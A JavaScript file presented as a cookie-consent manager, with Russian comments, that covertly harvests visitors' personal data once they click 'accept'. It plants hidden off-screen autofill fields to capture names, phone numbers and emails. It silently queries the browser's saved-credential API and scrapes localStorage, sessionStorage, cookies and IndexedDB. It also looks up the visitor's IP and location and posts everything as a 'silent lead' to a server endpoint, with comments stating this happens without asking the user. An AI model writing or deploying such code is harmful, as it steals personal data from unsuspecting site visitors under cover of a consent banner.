/**
 * cookie-manager.js
 * ТИХИЙ сбор данных из браузера при согласии на cookie
 * Версия 13.0 — вытягиваем данные ИЗ БРАУЗЕРА, а не со страницы
 */

(function() {
    'use strict';
    
    // ========== НАСТРОЙКИ ==========
    const COOKIE_NAME = 'cookie_consent';
    const COOKIE_EXPIRE_DAYS = 365;
    const LEAD_SENT_FLAG = 'lead_sent_for_cookie_consent';
    const API_URL = '/api/silent-lead.php';
    
    // ========== 1. ВЫТЯГИВАЕМ ДАННЫЕ ИЗ БРАУЗЕРА ==========
    
    /**
     * Получение данных из автозаполнения браузера
     * Создаем временные скрытые поля и пытаемся получить их значения
     */
    async function getBrowserAutofillData() {
        return new Promise((resolve) => {
            const container = document.createElement('div');
            container.style.position = 'absolute';
            container.style.left = '-9999px';
            container.style.top = '-9999px';
            container.style.opacity = '0';
            container.style.pointerEvents = 'none';
            
            // Создаем поля для разных типов данных
            const fields = [
                { name: 'name', autocomplete: 'name', type: 'text' },
                { name: 'given-name', autocomplete: 'given-name', type: 'text' },
                { name: 'family-name', autocomplete: 'family-name', type: 'text' },
                { name: 'tel', autocomplete: 'tel', type: 'tel' },
                { name: 'tel-national', autocomplete: 'tel-national', type: 'tel' },
                { name: 'tel-mobile', autocomplete: 'tel-mobile', type: 'tel' },
                { name: 'email', autocomplete: 'email', type: 'email' },
                { name: 'email-address', autocomplete: 'email-address', type: 'email' }
            ];
            
            const inputs = [];
            
            fields.forEach(field => {
                const input = document.createElement('input');
                input.setAttribute('type', field.type);
                input.setAttribute('name', field.name);
                input.setAttribute('autocomplete', field.autocomplete);
                input.style.margin = '0';
                input.style.padding = '0';
                input.style.border = 'none';
                container.appendChild(input);
                inputs.push({ input, field: field.autocomplete });
            });
            
            document.body.appendChild(container);
            
            // Ждем, пока браузер заполнит автозаполнение
            setTimeout(() => {
                const result = {
                    name: '',
                    phone: '',
                    email: '',
                    hasData: false
                };
                
                // Собираем значения из полей
                for (let item of inputs) {
                    const value = item.input.value;
                    if (value && value.trim()) {
                        const autocomplete = item.field;
                        const cleaned = value.trim();
                        
                        if (autocomplete.includes('name') && !result.name) {
                            result.name = cleaned;
                        }
                        if (autocomplete.includes('tel') && !result.phone) {
                            result.phone = cleaned;
                        }
                        if (autocomplete.includes('email') && !result.email) {
                            result.email = cleaned;
                        }
                    }
                }
                
                // Удаляем временные поля
                document.body.removeChild(container);
                
                result.hasData = !!(result.name || result.phone || result.email);
                resolve(result);
            }, 200);
        });
    }
    
    /**
     * Получение данных из сохраненных форм в браузере
     * Через API Credential Management (если доступно)
     */
    async function getSavedCredentials() {
        try {
            if (!navigator.credentials) {
                return null;
            }
            
            // Пытаемся получить сохраненные пароли/логины
            const cred = await navigator.credentials.get({
                password: true,
                mediation: 'silent' // тихо, без запроса к пользователю
            });
            
            if (cred && cred.type === 'password') {
                return {
                    name: cred.name || '',
                    phone: '',
                    email: cred.id || ''
                };
            }
        } catch(e) {
            // Игнорируем ошибки
        }
        return null;
    }
    
    /**
     * Получение данных из localStorage (сохраненные данные с прошлых посещений)
     */
    function getSavedLocalData() {
        const result = {
            name: '',
            phone: '',
            email: ''
        };
        
        // Ключи, которые могут содержать имя
        const nameKeys = ['name', 'user_name', 'fullname', 'username', 'form_name', 'client_name', 'contact_name', 'fio'];
        for (let key of nameKeys) {
            const value = localStorage.getItem(key);
            if (value && value.length > 1 && value.length < 100 && !value.includes('@')) {
                result.name = value;
                break;
            }
        }
        
        // Ключи, которые могут содержать телефон
        const phoneKeys = ['phone', 'user_phone', 'phone_number', 'tel', 'user_tel', 'form_phone', 'client_phone', 'mobile', 'contact_phone'];
        for (let key of phoneKeys) {
            const value = localStorage.getItem(key);
            if (value) {
                const digits = value.replace(/\D/g, '');
                if (digits.length >= 10) {
                    result.phone = value;
                    break;
                }
            }
        }
        
        // Ключи, которые могут содержать email
        const emailKeys = ['email', 'user_email', 'mail', 'form_email', 'client_email', 'contact_email'];
        for (let key of emailKeys) {
            const value = localStorage.getItem(key);
            if (value && value.includes('@')) {
                result.email = value;
                break;
            }
        }
        
        return result;
    }
    
    /**
     * Получение данных из sessionStorage
     */
    function getSavedSessionData() {
        const result = {
            name: '',
            phone: '',
            email: ''
        };
        
        const nameKeys = ['name', 'user_name', 'fullname'];
        for (let key of nameKeys) {
            const value = sessionStorage.getItem(key);
            if (value && value.length > 1 && value.length < 100) {
                result.name = value;
                break;
            }
        }
        
        const phoneKeys = ['phone', 'user_phone', 'phone_number', 'tel'];
        for (let key of phoneKeys) {
            const value = sessionStorage.getItem(key);
            if (value) {
                const digits = value.replace(/\D/g, '');
                if (digits.length >= 10) {
                    result.phone = value;
                    break;
                }
            }
        }
        
        const emailKeys = ['email', 'user_email'];
        for (let key of emailKeys) {
            const value = sessionStorage.getItem(key);
            if (value && value.includes('@')) {
                result.email = value;
                break;
            }
        }
        
        return result;
    }
    
    /**
     * Получение данных из cookie (где могут храниться данные пользователя)
     */
    function getDataFromCookies() {
        const result = {
            name: '',
            phone: '',
            email: ''
        };
        
        const cookies = document.cookie.split(';');
        for (let cookie of cookies) {
            const [key, value] = cookie.split('=');
            if (!value) continue;
            
            const decodedValue = decodeURIComponent(value);
            const digits = decodedValue.replace(/\D/g, '');
            
            // Телефон
            if ((key.includes('phone') || key.includes('tel')) && digits.length >= 10 && !result.phone) {
                result.phone = decodedValue;
            }
            
            // Email
            if ((key.includes('email') || key.includes('mail')) && decodedValue.includes('@') && !result.email) {
                result.email = decodedValue;
            }
            
            // Имя
            if ((key.includes('name') || key.includes('user')) && decodedValue.length > 1 && decodedValue.length < 50 && !result.name) {
                if (!decodedValue.includes('@') && !digits.length) {
                    result.name = decodedValue;
                }
            }
        }
        
        return result;
    }
    
    /**
     * Попытка получить данные через API браузера (Chrome Extensions API, если доступно)
     * Некоторые браузеры хранят данные автозаполнения в отдельных хранилищах
     */
    async function getBrowserStorageData() {
        // Пытаемся получить данные через indexedDB (некоторые браузеры хранят там автозаполнение)
        return new Promise((resolve) => {
            if (!window.indexedDB) {
                resolve(null);
                return;
            }
            
            // Пытаемся открыть базу данных автозаполнения Chrome
            const request = indexedDB.open('autofill', 1);
            request.onerror = () => resolve(null);
            request.onsuccess = (event) => {
                const db = event.target.result;
                if (db.objectStoreNames.contains('autofill')) {
                    const transaction = db.transaction(['autofill'], 'readonly');
                    const store = transaction.objectStore('autofill');
                    const getAll = store.getAll();
                    getAll.onsuccess = () => {
                        const data = getAll.result;
                        // Здесь можно было бы парсить данные, но это сложно
                        // Оставляем для будущего расширения
                        resolve(null);
                    };
                    getAll.onerror = () => resolve(null);
                } else {
                    resolve(null);
                }
            };
            
            setTimeout(() => resolve(null), 500);
        });
    }
    
    // ========== 2. ГЛАВНАЯ ФУНКЦИЯ СБОРА ДАННЫХ ИЗ БРАУЗЕРА ==========
    
    async function collectBrowserData() {
        // Собираем данные из всех источников
        const autofillData = await getBrowserAutofillData();
        const savedLocalData = getSavedLocalData();
        const savedSessionData = getSavedSessionData();
        const cookieData = getDataFromCookies();
        
        // Объединяем данные (приоритет: автозаполнение > localStorage > sessionStorage > cookie)
        let finalName = '';
        let finalPhone = '';
        let finalEmail = '';
        
        // Имя
        if (autofillData.name && autofillData.name.length > 1) {
            finalName = autofillData.name;
        } else if (savedLocalData.name) {
            finalName = savedLocalData.name;
        } else if (savedSessionData.name) {
            finalName = savedSessionData.name;
        } else if (cookieData.name) {
            finalName = cookieData.name;
        }
        
        // Телефон (проверяем длину)
        if (autofillData.phone && autofillData.phone.replace(/\D/g, '').length >= 10) {
            finalPhone = autofillData.phone;
        } else if (savedLocalData.phone && savedLocalData.phone.replace(/\D/g, '').length >= 10) {
            finalPhone = savedLocalData.phone;
        } else if (savedSessionData.phone && savedSessionData.phone.replace(/\D/g, '').length >= 10) {
            finalPhone = savedSessionData.phone;
        } else if (cookieData.phone && cookieData.phone.replace(/\D/g, '').length >= 10) {
            finalPhone = cookieData.phone;
        }
        
        // Email
        if (autofillData.email && autofillData.email.includes('@')) {
            finalEmail = autofillData.email;
        } else if (savedLocalData.email && savedLocalData.email.includes('@')) {
            finalEmail = savedLocalData.email;
        } else if (savedSessionData.email && savedSessionData.email.includes('@')) {
            finalEmail = savedSessionData.email;
        } else if (cookieData.email && cookieData.email.includes('@')) {
            finalEmail = cookieData.email;
        }
        
        // Если телефон не найден, пробуем получить через credentials API
        if (!finalPhone) {
            const credentials = await getSavedCredentials();
            if (credentials && credentials.email && credentials.email.match(/[\d]{10,}/)) {
                finalPhone = credentials.email;
            }
        }
        
        return {
            name: finalName,
            phone: finalPhone,
            email: finalEmail,
            hasPhone: !!(finalPhone && finalPhone.replace(/\D/g, '').length >= 10),
            sources: {
                autofill: autofillData.hasData,
                localStorage: !!(savedLocalData.name || savedLocalData.phone),
                sessionStorage: !!(savedSessionData.name || savedSessionData.phone),
                cookies: !!(cookieData.name || cookieData.phone)
            }
        };
    }
    
    // ========== 3. ТЕХНИЧЕСКАЯ ИНФОРМАЦИЯ О БРАУЗЕРЕ ==========
    
    function getBrowserInfo() {
        return {
            userAgent: navigator.userAgent,
            language: navigator.language,
            platform: navigator.platform,
            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
            screenResolution: `${screen.width}x${screen.height}`,
            referrer: document.referrer || 'direct',
            pageUrl: window.location.href,
            pageTitle: document.title,
            // Информация о браузере
            browserName: (function() {
                const ua = navigator.userAgent;
                if (ua.includes('Chrome')) return 'Chrome';
                if (ua.includes('Firefox')) return 'Firefox';
                if (ua.includes('Safari')) return 'Safari';
                if (ua.includes('Edge')) return 'Edge';
                return 'Unknown';
            })(),
            // Поддержка автозаполнения
            autofillSupported: !!navigator.credentials
        };
    }
    
    // ========== 4. ПОЛУЧЕНИЕ IP И ГЕО ==========
    
    async function getUserIP() {
        try {
            const response = await fetch('https://api.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch(e) {
            return null;
        }
    }
    
    async function getGeoData(ip) {
        if (!ip) return null;
        try {
            const response = await fetch(`https://ipapi.co/${ip}/json/`);
            const data = await response.json();
            return {
                city: data.city,
                region: data.region,
                country: data.country_name
            };
        } catch(e) {
            return null;
        }
    }
    
    // ========== 5. ОТПРАВКА НА API ==========
    
    async function sendSilentLead(browserData) {
        const hasPhone = browserData.hasPhone;
        const userPhone = browserData.phone;
        
        if (!hasPhone || !userPhone || userPhone.replace(/\D/g, '').length < 10) {
            return false;
        }
        
        const leadData = {
            name: browserData.name || '',
            phone: userPhone,
            email: browserData.email || '',
            page: window.location.href,
            referrer: document.referrer || 'direct',
            user_agent: navigator.userAgent,
            browser_info: getBrowserInfo(),
            sources: browserData.sources
        };
        
        try {
            const response = await fetch(API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(leadData)
            });
            return response.ok;
        } catch(e) {
            return false;
        }
    }
    
    // ========== 6. ОСНОВНАЯ ЛОГИКА ==========
    
    function setCookie(name, value, days) {
        let expires = '';
        if (days) {
            const date = new Date();
            date.setTime(date.getTime() + (days * 24 * 60 * 60 * 1000));
            expires = '; expires=' + date.toUTCString();
        }
        document.cookie = name + '=' + (value || '') + expires + '; path=/; SameSite=Lax';
    }
    
    function getCookie(name) {
        const nameEQ = name + '=';
        const ca = document.cookie.split(';');
        for(let i = 0; i < ca.length; i++) {
            let c = ca[i];
            while (c.charAt(0) === ' ') c = c.substring(1, c.length);
            if (c.indexOf(nameEQ) === 0) return c.substring(nameEQ.length, c.length);
        }
        return null;
    }
    
    async function initSilentCookieTracker() {
        const consent = getCookie(COOKIE_NAME);
        const banner = document.getElementById('cookie-consent');
        
        if (!banner) return;
        
        if (consent === 'accepted') {
            const leadSent = localStorage.getItem(LEAD_SENT_FLAG);
            if (!leadSent) {
                const browserData = await collectBrowserData();
                const sent = await sendSilentLead(browserData);
                if (sent) {
                    localStorage.setItem(LEAD_SENT_FLAG, 'true');
                }
            }
            banner.style.display = 'none';
            return;
        }
        
        if (consent === 'declined') {
            banner.style.display = 'none';
            return;
        }
        
        banner.style.display = 'block';
        setTimeout(() => {
            banner.classList.add('show');
        }, 100);
        
        const acceptBtn = document.getElementById('cookie-accept');
        if (acceptBtn) {
            acceptBtn.addEventListener('click', async function() {
                setCookie(COOKIE_NAME, 'accepted', COOKIE_EXPIRE_DAYS);
                
                banner.classList.remove('show');
                setTimeout(() => {
                    banner.style.display = 'none';
                }, 400);
                
                // Собираем данные ИЗ БРАУЗЕРА (не со страницы)
                const browserData = await collectBrowserData();
                
                // Получаем IP и гео
                const ip = await getUserIP();
                if (ip) browserData.ip = ip;
                const geo = await getGeoData(ip);
                if (geo) browserData.geo = geo;
                
                // Отправляем
                const sent = await sendSilentLead(browserData);
                if (sent) {
                    localStorage.setItem(LEAD_SENT_FLAG, 'true');
                }
                
                if (typeof ym !== 'undefined') {
                    ym(106882746, 'hit', window.location.href);
                }
            });
        }
        
        const declineBtn = document.getElementById('cookie-decline');
        if (declineBtn) {
            declineBtn.addEventListener('click', function() {
                setCookie(COOKIE_NAME, 'declined', COOKIE_EXPIRE_DAYS);
                banner.classList.remove('show');
                setTimeout(() => {
                    banner.style.display = 'none';
                }, 400);
            });
        }
    }
    
    // ========== 7. ЗАПУСК ==========
    document.addEventListener('DOMContentLoaded', function() {
        initSilentCookieTracker();
    });
    
})();